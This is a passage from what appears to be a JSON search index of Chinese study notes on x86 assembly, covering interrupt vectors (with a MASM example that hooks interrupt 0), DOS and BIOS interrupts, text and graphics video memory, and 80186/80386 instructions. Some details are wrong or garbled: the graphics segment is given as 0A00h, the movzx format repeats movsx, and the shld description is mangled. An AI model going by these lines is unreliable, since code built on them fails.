\u8fd0\u884c\u671f\u95f4\u9047\u5230\u67d0\u4e9b\u60c5\u51b5\u6682\u65f6\u4e2d\u6b62\u5f53\u524d\u7a0b\u5e8f\uff0c\u53bb\u6267\u884c\u53e6\u4e00\u6bb5\u7279\u6b8a\u5904\u7406\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u5206\u4e3a\u5185\u90e8\u4e2d\u65ad\u548c\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u7531 int \u6307\u4ee4\u6216\u8005 CPU \u7684\u67d0\u4e9b\u9519\u8bef\u6216\u8005\u8c03\u8bd5\u670d\u52a1\u5f15\u8d77\u7684\uff0c\u5916\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u65f6\u949f\u4e2d\u65ad\u3001\u952e\u76d8\u4e2d\u65ad\u7b49</p> <p>\u4e2d\u65ad\u8c03\u7528\u4e0e\u8fd4\u56de\u5728\u524d\u9762\u6307\u4ee4\u90e8\u5206\u6709\u4ecb\u7ecd</p>"},{"location":"cs/pl/asm/#_48","title":"\u4e2d\u65ad\u5411\u91cf","text":"<p>\u4e2d\u65ad\u5411\u91cf\u5373\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u5165\u53e3\u7684\u5730\u5740\uff0c\u4e3a 4 \u4e2a\u5b57\u8282\uff0c\u524d\u4e24\u4e2a\u5b57\u8282\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u4e3a\u6bb5\u5730\u5740</p> <p>\u7cfb\u7edf\u4e2d\u4e00\u5171\u6709 256 \u4e2a\u4e2d\u65ad\u53f7\uff0c\u8303\u56f4\u5728 00h \u5230 0FFh\uff0c\u6bb5\u5730\u5740 0000h \u5904\u4e3a\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u4e2d\u65ad\u5411\u91cf\u7684\u5730\u5740\u4f4d\u4e8e 0000:[4*\u4e2d\u65ad\u53f7]\uff0c\u4f8b\u5982 word ptr 0:[20h] \u5b58\u653e 8h \u65f6\u949f\u4e2d\u65ad\u7684\u504f\u79fb\u5730\u5740\uff0cword ptr 0:[22h] \u5b58\u653e\u65f6\u949f\u4e2d\u65ad\u7684\u6bb5\u5730\u5740</p>"},{"location":"cs/pl/asm/#_49","title":"\u66f4\u6539\u4e2d\u65ad\u5411\u91cf","text":"<p>\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4ee4 es \u4e3a 0\uff0c\u901a\u8fc7 es:[...] \u7684\u65b9\u5f0f\u6765\u66f4\u6539\u4e2d\u65ad\u5411\u91cf\uff0c\u4f46\u7a0b\u5e8f\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u6539\u56de\u6765\uff0c\u800c\u4ea7\u751f\u9519\u8bef\u3002\u56e0\u6b64\u8981\u5728\u6539\u4e4b\u524d\u5b58\u4e0b\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u7a0b\u5e8f\u7ed3\u675f\u524d\u518d\u6539\u56de\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf</p> \u4f8b <pre><code>code segment\nassume cs:code\nold_00h dw 0, 0\nint_00h:\n    mov ch, 10h\n    iret\nmain:\n    push cs\n    pop ds\n    xor ax, ax\n    mov es, ax\n    mov bx, 0\n    mov ax, es:[bx]\n    mov dx, es:[bx+2]\n    mov old_00h[0], ax\n    mov old_00h[2], dx\n    mov word ptr es:[bx], offset int_00h\n    mov es:[bx+2], cs\n    mov ax, 123h\n    mov ch, 1\n    div ch\n    mov ax, old_00h[0]\n    mov dx, old_00h[2]\n    mov es:[bx], ax\n    mov es:[bx+2], dx\n    mov ah, 4Ch\n    int 21h\ncode ends\nend main\n</code></pre>"},{"location":"cs/pl/asm/#_50","title":"\u9664\u6cd5\u6ea2\u51fa","text":"<p>\u9664\u6cd5\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u9664\u4ee5 0 \u4f1a\u6ea2\u51fa</li> <li>\u5546\u65e0\u6cd5\u4fdd\u5b58\u5230 al \u6216 ax \u4e2d\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa</li> </ul> <p>\u6ea2\u51fa\u7684\u65f6\u5019\u4f1a\u5728 div \u6307\u4ee4\u7684\u524d\u9762\u63d2\u5165\u4e00\u6761 <code>int 00h</code> \u5e76\u8fd0\u884c\uff0cDOS \u6267\u884c 0 \u53f7\u4e2d\u65ad\u4f1a\u8f93\u51fa\u6ea2\u51fa\u4fe1\u606f\u5e76\u7ec8\u6b62\u7a0b\u5e8f</p> <p>\u56e0\u6b64\u4e5f\u5c31\u53ef\u4ee5\u4fee\u6539 0 \u53f7\u4e2d\u65ad\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u4f7f\u4e4b\u7ee7\u7eed\u8fd0\u884c\uff0c0 \u53f7\u4e2d\u65ad\u9000\u51fa\u540e\u4ecd\u4f1a\u91cd\u65b0\u8fd0\u884c\u521a\u521a\u51fa\u73b0\u95ee\u9898\u7684 div \u6307\u4ee4\uff0c\u4e00\u4e2a\u4f8b\u5b50\u89c1\u4e0a\uff08\u5373\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u7684\u90a3\u4e2a\u4f8b\u5b50\uff09</p>"},{"location":"cs/pl/asm/#_51","title":"\u65f6\u949f\u5ef6\u8fdf","text":""},{"location":"cs/pl/asm/#dos","title":"DOS \u4e2d\u65ad","text":"<p>DOS \u4e2d\u65ad\u5373\u662f int 21h\uff0c\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u96c6\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\u3001\u8fdb\u7a0b\u7ba1\u7406\u7684\u4e2d\u65ad\u8c03\u7528\uff0c\u63d0\u4f9b\u4e86\u8bf8\u591a\u5b50\u529f\u80fd\uff08ah \u4e3a\u529f\u80fd\u53f7\uff09\uff0c\u5b8c\u6574\u89c1 Ralf Brown's Interrupt List\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u529f\u80fd</p> AH=01h <ul> <li>\u529f\u80fd\uff1a\u8f93\u5165\u5b57\u7b26\u529f\u80fd</li> <li>\u4f5c\u7528\uff1a\u4ece\u952e\u76d8\u8bfb\u5165\u5355\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u662f Ctrl-Break \u5219\u9000\u51fa\uff0c\u5426\u5219\u5c06\u952e\u503c\u9001\u5165 al \u4e2d</li> </ul> AH=02h <ul> <li>\u529f\u80fd\uff1a\u8f93\u51fa\u5b57\u7b26\u529f\u80fd</li> <li>\u4f5c\u7528\uff1a\u5c06 dl \u4ee5\u5b57\u7b26\u7684\u5f62\u5f0f\uff08ASCII\uff09\u6253\u5370\u51fa\u6765</li> </ul> AH=09h <ul> <li>\u529f\u80fd\uff1a\u8f93\u51fa\u5b57\u7b26\u4e32\u529f\u80fd</li> <li>\u4f5c\u7528\uff1a\u5c06 ds:dx \u5904\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u8be5\u5b57\u7b26\u4e32\u5fc5\u987b\u4ee5 '$' \u7ed3\u5c3e</li> </ul> AH=0Ah <ul> <li>\u529f\u80fd\uff1a\u8f93\u5165\u5b57\u7b26\u4e32\u529f\u80fd</li> <li>\u4f5c\u7528\uff1ads:dx \u4e3a\u4e00\u4e2a buf\uff0cbuf \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e3a\u5141\u8bb8\u8f93\u5165\u7684\u6700\u591a\u5b57\u7b26\u6570\uff0c\u4e2d\u65ad\u540e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53d8\u4e3a\u5b9e\u9645\u8f93\u5165\u7684\u5b57\u7b26\u6570\uff0c\u7b2c\u4e09\u4e2a\u5b57\u8282\u5f00\u59cb\u662f\u8f93\u5165\u7684\u5b57\u7b26\u5185\u5bb9\u3002\u5982\u679c\u8f93\u5165\u8d85\u8fc7\u6700\u5927\u5b57\u7b26\u6570\uff0c\u5219\u4f1a\u53d1\u51fa\u94c3\u58f0\uff0c\u5e76\u4e14\u5149\u6807\u4e0d\u518d\u79fb\u52a8</li> </ul> AH=4Ch <ul> <li>\u529f\u80fd\uff1a\u7ec8\u6b62\u7a0b\u5e8f\u529f\u80fd</li> <li>\u4f5c\u7528\uff1a\u9000\u51fa\u5f53\u524d\u7a0b\u5e8f\uff0c\u8fd4\u56de\u7801\u4e3a al\uff08DOS \u4e2d\u4e0d\u4f1a\u5904\u7406\uff0c\u53ef\u4ee5\u4e0d\u5199\uff09</li> </ul>"},{"location":"cs/pl/asm/#bios","title":"BIOS \u4e2d\u65ad","text":"int 10h <ul> <li>\u7c7b\u578b\uff1a\u89c6\u9891\u4e2d\u65ad</li> <li>\u5b50\u529f\u80fd\uff1aah = 00h \u53f7\u529f\u80fd\u5207\u6362\u663e\u793a\u6a21\u5f0f<ul> <li>al = 03h \u8868\u793a 80*25 \u6587\u672c\u6a21\u5f0f</li> <li>al = 13h \u8868\u793a 320*200*256 \u56fe\u5f62\u6a21\u5f0f</li> </ul> </li> </ul>"},{"location":"cs/pl/asm/#_52","title":"\u6587\u672c\u6a21\u5f0f\u7f16\u7a0b","text":"<p>\u7a0b\u5e8f\u8fd0\u884c\u65f6\u9ed8\u8ba4\u7ec8\u7aef\u5c31\u5904\u4e8e\u6587\u672c\u6a21\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u5199\u5165\u76f8\u5e94\u5185\u5b58\u5730\u5740\u6765\u66f4\u6539\u663e\u793a\u6587\u672c\u7684\u5185\u5bb9</p> <p>\u6574\u4e2a\u6587\u672c\u6a21\u5f0f\u7684\u5c4f\u5e55\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a (0, 0)\uff0c\u53f3\u4e0b\u89d2\u5750\u6807\u4e3a (79, 24)\u3002\u5185\u5b58\u7ed3\u6784\u4e3a\u4e00\u4e2a\u5b57\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff08\u9ad8 8 \u4f4d\u4e3a\u663e\u793a\u7684\u5b57\u7b26\uff0c\u4f4e 8 \u4f4d\u4e2d\u9ad8 4 \u4f4d\u4e3a\u80cc\u666f\u8272\uff0c\u4f4e 4 \u4f4d\u4e3a\u524d\u666f\u8272\uff09\uff0c(x, y) \u4f4d\u7f6e\u5904\u7684\u5b57\u7b26\u5bf9\u5e94\u5185\u5b58\u4f4d\u4e8e word ptr B800:[(y*80+x)*2] \u5904</p> <p>\u7f16\u7a0b\u65f6\u5148\u8bbe\u7f6e es \u4e3a 0B800h\uff0c\u7136\u540e\u8ba1\u7b97\u51fa bx = (y*80+x)*2\uff0c\u7136\u540e\u4ee4 byte ptr es:[bx] = \u5b57\u7b26\uff0cbyte ptr es:[bx+1] = \u989c\u8272</p>"},{"location":"cs/pl/asm/#_53","title":"\u56fe\u5f62\u6a21\u5f0f\u7f16\u7a0b","text":"<p>\u628a\u663e\u5361\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\u4f7f\u7528 int 10h \u4e2d\u65ad\uff0c<code>mov ax, 0013h</code> \u8bbe\u7f6e\u5b50\u529f\u80fd\u53f7\u4e3a 0\uff0c\u6a21\u5f0f\u7f16\u53f7 al \u4e3a 13h \u5373\u56fe\u5f62\u6a21\u5f0f\uff0c\u7136\u540e <code>int 10h</code> \u5373\u53ef\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f 320*200 \u5206\u8fa8\u7387\u3001256 \u8272\u7684\u6a21\u5f0f\u3002</p> <p>\u5c4f\u5e55\u4e0a\u7684\u4e00\u4e2a\u70b9\u5bf9\u5e94\u663e\u5361\u5185\u5b58\u4e0a\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u989c\u8272\u3002\u70b9 (x, y) \u4f4d\u4e8e\u5185\u5b58 0A00:[320*y+x] \u7684\u4f4d\u7f6e\uff0c\u989c\u8272\uff1a <pre><code>0 \u9ed1    1 \u84dd    2 \u7eff    3 \u9752    4 \u7ea2    5 \u6d0b\u7ea2\n6 \u68d5    7 \u767d    8 \u7070    9 \u4eae\u84dd  A \u4eae\u7eff  B \u4eae\u9752\nC \u4eae\u7ea2  D \u7d2b    E \u9ec4    F \u4eae\u767d\n</code></pre> \u7f16\u7a0b\u65f6\u8bbe\u7f6e es \u4e3a 0A00h\uff0c\u7136\u540e\u5411 byte ptr es:[...] \u4e2d\u5199\u5165\u989c\u8272\u7801\u5373\u53ef\u66f4\u6539\u67d0\u5904\u50cf\u7d20\u70b9\u989c\u8272</p> <p>\u518d\u4f7f\u7528 <code>mov ax, 0003h</code> \u540e <code>int 10h</code> \u5207\u6362\u56de\u6587\u672c\u6a21\u5f0f</p>"},{"location":"cs/pl/asm/#80x86","title":"80x86 \u589e\u52a0\u6307\u4ee4","text":""},{"location":"cs/pl/asm/#80186","title":"80186","text":"insb 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ainsb / rep insb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(input from port to string) \u7b49\u4ef7\u4e8e in al, dx; mov es:[di], al \u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> insw 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ainsw / rep insw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(input from port to string) \u7b49\u4ef7\u4e8e in ax, dx; mov es:[di], ax \u5e76\u79fb\u52a8 di</li> <li>\u6ce8\u610f\uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> outsb 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aoutsb / rep outsb</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(output string to port) \u7b49\u4ef7\u4e8e mov al, ds:[si]; out al, dx \u5e76\u79fb\u52a8 si</li> <li>\u6ce8\u610f\uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> outsw 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aoutsw / rep outsw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(output string to port) \u7b49\u4ef7\u4e8e mov ax, ds:[si]; out ax, dx \u5e76\u79fb\u52a8 si</li> <li>\u6ce8\u610f\uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a</li> </ul> pusha 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apusha</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1apush \u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a ax cx dx bx sp bp si di</li> </ul> popa 80186 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apopa</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1apop \u5230\u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a di si bp sp bx dx cx ax</li> </ul> \u7acb\u5373\u6570\u8bed\u6cd5\u6269\u5c55 80186 <ul> <li>push \u53ef\u4ee5\u76f4\u63a5\u63a5\u7acb\u5373\u6570</li> <li>imul shl shr sal sar rol ror rcl rcr \u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570</li> </ul>"},{"location":"cs/pl/asm/#80286","title":"80286","text":"<p>80286 \u589e\u52a0\u4e86\u4fdd\u62a4\u6a21\u5f0f\u53ca\u76f8\u5173\u6307\u4ee4\uff0c\u4e0d\u5199\u5728\u8fd9\u91cc\u4e86</p>"},{"location":"cs/pl/asm/#80386","title":"80386","text":"<p>80386\uff08\u5373 i386\uff09\u5347\u7ea7\u5230\u4e86 32 \u4f4d\u67b6\u6784\uff0c\u5bc4\u5b58\u5668\u5747\u53d8\u4e3a 32 \u4f4d\uff08\u4ee5 e \u5f00\u5934\uff09\uff0c\u589e\u52a0\u4e86 fs gs \u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\u3002\u4e00\u4e9b\u6307\u4ee4\u4ece 8086 \u81ea\u7136\u6269\u5c55\u652f\u6301 32 \u4f4d\uff0c\u4e0d\u5728\u6b64\u8d58\u8ff0</p>"},{"location":"cs/pl/asm/#bit","title":"bit \u76f8\u5173\u6307\u4ee4","text":"bt 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abt src, pos</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit test) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d</li> <li>\u6ce8\u610f\uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF bts 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abts src, pos</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit test and set) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 1</li> <li>\u6ce8\u610f\uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF btr 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abtr src, pos</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit test and reset) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 0</li> <li>\u6ce8\u610f\uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF btc 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abtc src, pos</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit test and complement) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u53cd\u8f6c</li> <li>\u6ce8\u610f\uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF bsf 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1absf dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit scan forward) \u5728 src \u4e2d\u641c\u7d22\u6700\u4f4e\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0</li> </ul> OF DF IF TF SF ZF AF PF CF bsr 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1absr dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(bit scan reverse) \u5728 src \u4e2d\u641c\u7d22\u6700\u9ad8\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_54","title":"\u6570\u636e\u8f6c\u79fb\u6307\u4ee4","text":"movsx 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amovsx dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(move with sign-extension) \u5c06 src \u7b26\u53f7\u6269\u5c55\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -&gt; 16\u30018 -&gt; 32\u300116 -&gt; 32</li> </ul> movzx 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amovsx dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a(move with zero-extension) \u5c06 src \u96f6\u6269\u5c55\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -&gt; 16\u30018 -&gt; 32\u300116 -&gt; 32</li> </ul> pushad 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apushad</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\u538b\u5165\u5806\u6808\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a eax ecx edx ebx esp ebp esi edi</li> <li>\u6ce8\u610f\uff1apusha \u4ecd\u4e3a\u538b\u5165 16 \u4f4d\u5bc4\u5b58\u5668</li> </ul> popad 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apopad</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1apop \u51fa 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a edi esi ebp esp ebx edx ecx eax</li> <li>\u6ce8\u610f\uff1apopa \u4ecd\u4e3a\u5f39\u51fa 16 \u4f4d\u5bc4\u5b58\u5668</li> </ul> pushfd 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apushfd</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 eflags \u538b\u5165\u5806\u6808</li> <li>\u6ce8\u610f\uff1apushf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09</li> </ul> popfd 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apopfd</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece\u5806\u6808\u5f39\u51fa\u5230 eflags</li> <li>\u6ce8\u610f\uff1apopf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF lss 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alss dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ss:dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32</li> </ul> lfs 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alfs dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 fs:dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32</li> </ul> lgs 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1algs dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 gs:dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32</li> </ul>"},{"location":"cs/pl/asm/#_55","title":"\u8f6c\u6362\u6307\u4ee4","text":"cdq 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acdq</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 eax \u6269\u5145\u4e3a edx:eax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 eax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 edx</li> </ul> cwde 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acwde</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 ax \u7b26\u53f7\u6269\u5145\u4e3a eax</li> <li>\u6ce8\u610f\uff1acwd \u4ecd\u4e3a\u5c06 ax \u6269\u5145\u5230 dx:ax</li> </ul>"},{"location":"cs/pl/asm/#_56","title":"\u8fd0\u7b97\u6307\u4ee4","text":"imul \u8bed\u6cd5\u6269\u5c55 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aimul dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08\u652f\u6301\u4f20\u5165\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09dest = dest * src\uff0c\u622a\u53d6\u7ed3\u679c\u7684\u4f4e\u4f4d\u5b58\u5165 dest</li> <li>\u6ce8\u610f\uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5b58\u50a8\u5355\u5143\u3002\u7ed3\u679c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\u4e58\u6cd5\u548c\u65e0\u7b26\u53f7\u6570\u4e58\u6cd5\u76f8\u540c</li> </ul> shld 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ashld r1, r2, imm / shld r1, r2, cl</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ar1 = r1&lt;&gt;(register_width - cl) <li>\u6ce8\u610f\uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined</li> OF DF IF TF SF ZF AF PF CF shrd 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ashrd r1, r2, imm / shrd r1, r2, cl</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ar1 = r1&gt;&gt;cl \u2223 r2&lt;&lt;(register_width - cl)</li> <li>\u6ce8\u610f\uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined</li> </ul> OF DF IF TF SF ZF AF PF CF setcc \u7c7b\u6307\u4ee4 80386 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asetcc dest</li> 